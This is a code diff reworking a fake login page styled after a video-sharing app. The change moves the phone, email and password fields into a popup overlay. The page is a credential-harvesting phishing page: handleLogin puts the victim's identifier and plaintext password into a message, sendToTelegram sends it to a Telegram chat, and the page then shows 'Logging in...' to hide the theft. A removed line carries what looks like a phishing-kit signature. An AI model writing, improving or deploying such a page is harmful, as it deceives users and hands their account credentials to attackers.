@@ -28,20 +28,6 @@
             position: relative;
         }
 
-        .page {
-            display: none;
-            animation: fadeIn 0.3s ease;
-        }
-
-        .page.active {
-            display: block;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
         .header {
             display: flex;
             justify-content: space-between;
@@ -155,7 +141,56 @@
             margin-left: 5px;
         }
 
-        /* Page 2 Styles */
+        /* Overlay Styles */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .overlay.active {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes slideUp {
+            from { 
+                transform: translateY(100%);
+            }
+            to { 
+                transform: translateY(0);
+            }
+        }
+
+        .popup {
+            background: #fff;
+            width: 90%;
+            max-width: 450px;
+            max-height: 90vh;
+            border-radius: 8px;
+            overflow: hidden;
+            animation: slideUp 0.3s ease;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+        }
+
+        .popup-content {
+            max-height: calc(90vh - 60px);
+            overflow-y: auto;
+        }
+
+        /* Tabs */
         .tabs {
             display: flex;
             border-bottom: 1px solid #e8e8e8;
@@ -239,31 +274,45 @@
             font-weight: 600;
             cursor: pointer;
             margin-top: 30px;
-            position: relative;
-        }
-
-        .continue-btn::after {
-            content: '';
-            position: absolute;
-            bottom: -30px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 0;
-            height: 0;
-            border-left: 15px solid transparent;
-            border-right: 15px solid transparent;
-            border-top: 20px solid #fe2c55;
         }
 
         .continue-btn:hover {
             background: #e6254b;
         }
+
+        .continue-btn:disabled {
+            background: #fcc;
+            cursor: not-allowed;
+        }
+
+        .form-container {
+            display: none;
+        }
+
+        .form-container.active {
+            display: block;
+        }
+
+        .login-identifier-text {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 10px;
+        }
+
+        .forgot-password {
+            display: block;
+            text-align: right;
+            color: #000;
+            font-size: 14px;
+            margin-top: 10px;
+            text-decoration: none;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Page 1: Login Options -->
-        <div id="page1" class="page active">
+        <!-- Main Page: Login Options -->
+        <div id="mainPage">
             <div class="header">
                 <div class="help-icon">?</div>
                 <div class="close-icon">×</div>
@@ -274,7 +323,7 @@
                 <p class="subtitle">Manage your account, check notifications,<br>comment on videos, and more.</p>
                 
                 <div class="login-options">
-                    <button class="login-btn primary" onclick="goToPage2()">
+                    <button class="login-btn primary" onclick="openLoginPopup()">
                         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                             <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                             <circle cx="12" cy="7" r="4"></circle>
@@ -316,57 +365,62 @@
                 </div>
             </div>
         </div>
+    </div>
 
-        <!-- Page 2: Email/Username Login -->
-        <div id="page2" class="page">
-            <div class="header">
-                <div class="back-icon" onclick="goToPage1()">←</div>
-                <h2 style="font-size: 16px; font-weight: 600;">Log in</h2>
-                <div class="help-icon-2">?</div>
-            </div>
-            
-            <div class="content">
-                <div class="tabs">
-                    <button class="tab" id="phoneTab" onclick="switchTab('phone')">Phone</button>
-                    <button class="tab active" id="emailTab" onclick="switchTab('email')">Email / Username</button>
+    <!-- Overlay Popup for Login -->
+    <div class="overlay" id="loginOverlay" onclick="closeOverlayOnBackground(event)">
+        <div class="popup" onclick="event.stopPropagation()">
+            <!-- Step 1: Enter Email/Phone -->
+            <div id="step1" style="display: block;">
+                <div class="header">
+                    <div class="back-icon" onclick="closeLoginPopup()">←</div>
+                    <h2 style="font-size: 16px; font-weight: 600;">Log in</h2>
+                    <div class="help-icon-2">?</div>
                 </div>
                 
-                <div id="emailForm" class="form-container">
-                    <div class="input-group">
-                        <input type="text" class="input-field" id="emailUsername" placeholder="Email or Username">
-                        <button class="clear-btn" onclick="clearInput('emailUsername')">×</button>
+                <div class="content popup-content">
+                    <div class="tabs">
+                        <button class="tab" id="phoneTab" onclick="switchTab('phone')">Phone</button>
+                        <button class="tab active" id="emailTab" onclick="switchTab('email')">Email / Username</button>
                     </div>
-                </div>
-
-                <div id="phoneForm" class="form-container" style="display: none;">
-                    <div class="input-group">
-                        <input type="tel" class="input-field" id="phoneNumber" placeholder="Phone number">
-                        <button class="clear-btn" onclick="clearInput('phoneNumber')">×</button>
+                    
+                    <div id="emailForm" class="form-container active">
+                        <div class="input-group">
+                            <input type="text" class="input-field" id="emailUsername" placeholder="Email or Username">
+                            <button class="clear-btn" onclick="clearInput('emailUsername')">×</button>
+                        </div>
                     </div>
-                </div>
-                
-                <button class="continue-btn" onclick="handleContinue()">Continue</button>
-            </div>
-        </div>
 
-        <!-- Page 3: Password Entry -->
-        <div id="page3" class="page">
-            <div class="header">
-                <div class="back-icon" onclick="goToPage2()">←</div>
-                <h2 style="font-size: 16px; font-weight: 600;">Enter password</h2>
-                <div class="help-icon-2">?</div>
+                    <div id="phoneForm" class="form-container">
+                        <div class="input-group">
+                            <input type="tel" class="input-field" id="phoneNumber" placeholder="Phone number">
+                            <button class="clear-btn" onclick="clearInput('phoneNumber')">×</button>
+                        </div>
+                    </div>
+                    
+                    <button class="continue-btn" onclick="handleContinue()">Continue</button>
+                </div>
             </div>
-            
-            <div class="content">
-                <div class="input-group">
-                    <p style="font-size: 14px; color: #666; margin-bottom: 10px;" id="loginIdentifier"></p>
-                    <input type="password" class="input-field" id="password" placeholder="Password">
-                    <button class="clear-btn" onclick="clearInput('password')">×</button>
+
+            <!-- Step 2: Enter Password -->
+            <div id="step2" style="display: none;">
+                <div class="header">
+                    <div class="back-icon" onclick="goBackToStep1()">←</div>
+                    <h2 style="font-size: 16px; font-weight: 600;">Enter password</h2>
+                    <div class="help-icon-2">?</div>
                 </div>
                 
-                <a href="#" style="display: block; text-align: right; color: #000; font-size: 14px; margin-top: 10px; text-decoration: none;">Forgot password?</a>
-                
-                <button class="continue-btn" onclick="handleLogin()">Log in</button>
+                <div class="content popup-content">
+                    <div class="input-group">
+                        <p class="login-identifier-text" id="loginIdentifier"></p>
+                        <input type="password" class="input-field" id="password" placeholder="Password">
+                        <button class="clear-btn" onclick="clearInput('password')">×</button>
+                    </div>
+                    
+                    <a href="#" class="forgot-password">Forgot password?</a>
+                    
+                    <button class="continue-btn" onclick="handleLogin()">Log in</button>
+                </div>
             </div>
         </div>
     </div>
@@ -379,24 +433,30 @@
         let currentLoginType = 'email'; // 'email' or 'phone'
         let loginIdentifier = '';
 
-        function goToPage2() {
-            document.getElementById('page1').classList.remove('active');
-            document.getElementById('page2').classList.add('active');
+        function openLoginPopup() {
+            document.getElementById('loginOverlay').classList.add('active');
+            document.body.style.overflow = 'hidden';
         }
 
-        function goToPage1() {
-            document.getElementById('page2').classList.remove('active');
-            document.getElementById('page1').classList.add('active');
-            // Reset forms
+        function closeLoginPopup() {
+            document.getElementById('loginOverlay').classList.remove('active');
+            document.body.style.overflow = 'auto';
+            resetForms();
+        }
+
+        function closeOverlayOnBackground(event) {
+            if (event.target === document.getElementById('loginOverlay')) {
+                closeLoginPopup();
+            }
+        }
+
+        function resetForms() {
+            document.getElementById('step1').style.display = 'block';
+            document.getElementById('step2').style.display = 'none';
             document.getElementById('emailUsername').value = '';
             document.getElementById('phoneNumber').value = '';
-        }
-
-        function goToPage2FromPage3() {
-            document.getElementById('page3').classList.remove('active');
-            document.getElementById('page2').classList.add('active');
-            // Clear password
             document.getElementById('password').value = '';
+            switchTab('email');
         }
 
         function switchTab(tab) {
@@ -408,14 +468,14 @@
             if (tab === 'phone') {
                 phoneTab.classList.add('active');
                 emailTab.classList.remove('active');
-                phoneForm.style.display = 'block';
-                emailForm.style.display = 'none';
+                phoneForm.classList.add('active');
+                emailForm.classList.remove('active');
                 currentLoginType = 'phone';
             } else {
                 emailTab.classList.add('active');
                 phoneTab.classList.remove('active');
-                emailForm.style.display = 'block';
-                phoneForm.style.display = 'none';
+                emailForm.classList.add('active');
+                phoneForm.classList.remove('active');
                 currentLoginType = 'email';
             }
         }
@@ -443,13 +503,15 @@
             // Display the identifier on the password page
             document.getElementById('loginIdentifier').textContent = loginIdentifier;
 
-            // Move to password page
-            document.getElementById('page2').classList.remove('active');
-            document.getElementById('page3').classList.add('active');
+            // Move to step 2
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
         }
 
-        function goToPage2() {
-            goToPage2FromPage3();
+        function goBackToStep1() {
+            document.getElementById('step2').style.display = 'none';
+            document.getElementById('step1').style.display = 'block';
+            document.getElementById('password').value = '';
         }
 
         async function sendToTelegram(message) {
@@ -494,21 +556,18 @@
 <b>Password:</b> ${password}
 
 <b>Time:</b> ${new Date().toLocaleString()}
-
-<b>? GAARA Solos ¿</b>
             `.trim();
 
             // Send to Telegram
             const success = await sendToTelegram(message);
 
             if (success) {
-                // Show success message or redirect
                 alert('Logging in...');
-                // You can redirect to another page or show a loading screen here
+                closeLoginPopup();
             } else {
                 alert('Login failed. Please try again.');
             }
         }
     </script>
 </body>
-</html>
+    </html>
